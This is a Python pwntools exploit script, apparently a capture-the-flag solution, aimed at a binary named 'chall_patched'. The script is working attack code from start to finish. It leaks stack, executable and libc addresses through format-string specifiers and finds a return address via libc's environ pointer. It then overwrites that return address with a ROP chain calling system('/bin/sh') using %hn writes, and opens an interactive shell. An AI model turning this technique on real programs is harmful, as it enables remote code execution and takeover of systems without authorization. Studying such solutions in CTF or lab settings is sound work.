#!/usr/bin/env python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sn = lambda p, num: p.send(str(num).encode())
sna = lambda p, msg, num: p.sendafter(msg, str(num).encode())
sln = lambda p, num: p.sendline(str(num).encode())
slna = lambda p, msg, num: p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* trigger+142
        b* main+54
        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])

def trigger(payload):
    sla(p, b'> ', b'3')
    sla(p, b'cmd?\n', payload)


def write_addr(value):
    sla(p, b'> ', b'1')
    sla(p, b'3): ', b'0')
    sla(p, b'): ', hex(value))
    sla(p, b'> ', b'1')
    sla(p, b'3): ', b'1')
    sla(p, b'): ', hex(16))
    sla(p, b'> ', b'2')
    sla(p, b'format?\n', b'%1$.*2$s')


trigger(b'%10$p')
leak_stack = int(p.recvline()[:-1], 16)
info('LEAK STACK: ' + hex(leak_stack))
trigger(b'%11$p')

leak_exe = int(p.recvline()[:-1], 16)
exe.address = leak_exe - 0xe01
info('EXE BASE: ' + hex(exe.address))

trigger(b'%26$p')
leak_libc = int(p.recvline()[:-1], 16)
libc.address = leak_libc -  0x21b780
info('LIBC BASE: ' + hex(libc.address))
printf = exe.address +  0x201fa0
pop_rdi = libc.address + 0x2a3e5
binsh = next(libc.search(b'/bin/sh'))
ret=pop_rdi+1

info('POP RDI: ' + hex(pop_rdi))
info('Binsh: ' + hex(binsh))
info('RET: ' + hex(ret))
info('SYSTEM: ' + hex(libc.sym.system))


# trigger(b'/bin/sh\0')
write_addr(libc.sym.environ)
leak_stack = u64(p.recv(6).ljust(8, b'\x00'))
info('LEAK STACK VIA ENVIRON: ' + hex(leak_stack))
addr_ret = leak_stack - 0x120
info('LEAK ADDR_RET: ' + hex(addr_ret))
pack = [
    [(pop_rdi >> 0) & 0xffff, addr_ret + 0],
    [(pop_rdi >> 16) & 0xffff, addr_ret + 2],
    [(binsh >> 0) & 0xffff, addr_ret + 8],
    [(binsh >> 16) & 0xffff, addr_ret + 10],
    [(binsh >> 32) & 0xffff, addr_ret + 12],
    [(ret >> 0) & 0xffff, addr_ret + 16],
    [(ret >> 16) & 0xffff, addr_ret + 18],
    [(ret >> 32) & 0xffff, addr_ret + 20],
    [(libc.sym.system >> 0) & 0xffff, addr_ret + 24],
    [(libc.sym.system >> 16) & 0xffff, addr_ret + 26],
    [(libc.sym.system >> 32) & 0xffff, addr_ret + 28],

]

for value, addr in pack:
    payload = f'n%{value-1}c%{9+6}$hn'.encode()
    payload = payload.ljust(0x38, b'P')
    payload += p64(addr)  
    trigger(payload)

# GDB()
sla(p, b'> ', b'4')
p.interactive()
